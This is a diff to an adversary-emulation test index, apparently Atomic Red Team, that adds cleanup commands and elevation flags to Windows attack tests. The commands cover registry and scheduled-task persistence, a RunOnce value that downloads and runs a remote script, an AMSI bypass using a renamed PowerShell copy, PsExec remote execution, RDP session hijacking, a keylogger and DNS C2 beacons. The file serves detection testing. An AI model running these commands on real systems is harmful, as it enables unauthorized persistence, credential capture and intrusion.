@@ -1513,11 +1513,14 @@ persistence:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -3808,9 +3811,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.exe
       executor:
         name: command_prompt
-        command: |
-          REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
-          REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
+        command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V
+          "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+          /V "Atomic Red Team" /f
+
+'
     - name: Reg Key RunOnce
       description: 'RunOnce Key Persistence
 
@@ -3824,9 +3832,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.dll
       executor:
         name: command_prompt
-        command: |
-          REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
-          REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
+        command: 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /f
+
+'
     - name: PowerShell Registry RunOnce
       description: 'RunOnce Key Persistence via PowerShell
 
@@ -3843,27 +3856,9 @@ persistence:
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
           set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
-          Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
-    - name: Startup Folder
-      description: 'Add Shortcut To Startup via PowerShell
+        cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 
 '
-      supported_platforms:
-      - windows
-      input_arguments:
-        thing_to_execute:
-          description: Thing to Run
-          type: Path
-          default: C:\Path\AtomicRedTeam.exe
-      executor:
-        name: powershell
-        command: |
-          $TargetFile = "$env:SystemRoot\System32\#{thing_to_execute}"
-          $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
-          $WScriptShell = New-Object -ComObject WScript.Shell
-          $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-          $Shortcut.TargetPath = $TargetFile
-          $Shortcut.Save()
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -3982,8 +3977,11 @@ persistence:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -4015,13 +4013,18 @@ persistence:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -6783,11 +6786,14 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1073:
     technique:
       x_mitre_data_sources:
@@ -13204,11 +13210,14 @@ privilege-escalation:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -14352,8 +14361,11 @@ privilege-escalation:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -14385,13 +14397,18 @@ privilege-escalation:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -19566,10 +19583,16 @@ credential-access:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1141:
     technique:
       x_mitre_data_sources:
@@ -22099,8 +22122,11 @@ execution:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -22132,13 +22158,18 @@ execution:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
     - name: Powershell Cmdlet Scheduled Task
-      description: "Create an atomic scheduled task that leverages native powershell
-        cmdlets. \nThese could be concidered \"fileless\" scheduled task creation.\n"
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
       supported_platforms:
       - windows
       executor:
@@ -22301,9 +22332,11 @@ execution:
       identifier: T1035
     atomic_tests:
     - name: Execute a Command as a Service
-      description: "Creates a service specifying an aribrary command and executes
+      description: 'Creates a service specifying an aribrary command and executes
         it. When executing commands such as PowerShell, the service will report that
-        it did not start correctly even when code executes properly. \n"
+        it did not start correctly even when code executes properly.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -22323,6 +22356,30 @@ execution:
           sc.exe create #{service_name} binPath= #{executable_command}
           sc.exe start #{service_name}
           sc.exe delete #{service_name}
+    - name: Use PsExec to execute a command on a remote host
+      description: |
+        Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
+        Will run a command on a remote host
+      supported_platforms:
+      - windows
+      input_arguments:
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+        remote_host:
+          description: Remote hostname or IP address
+          type: string
+          default: localhost
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
+
+'
+        command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
+
+'
   T1218:
     technique:
       x_mitre_data_sources:
@@ -24049,7 +24106,9 @@ lateral-movement:
           query user
           sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
           net start sesshijack
-          sc.exe delete sesshijack
+        cleanup_command: 'sc.exe delete sesshijack
+
+'
     - name: RDPto-DomainController
       description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
         RDPs to (%logonserver%) as the current user
@@ -25374,10 +25433,16 @@ collection:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1113:
     technique:
       x_mitre_data_sources:
@@ -26782,9 +26847,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter}
-          -RunTime #{runtime}\n"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
     - name: DNS Long Domain Query
       description: |
         This test simulates an infected host returning data to a command and control server using long domain names.
@@ -26808,8 +26873,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type}"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
   T1065:
     technique:
       x_mitre_data_sources:
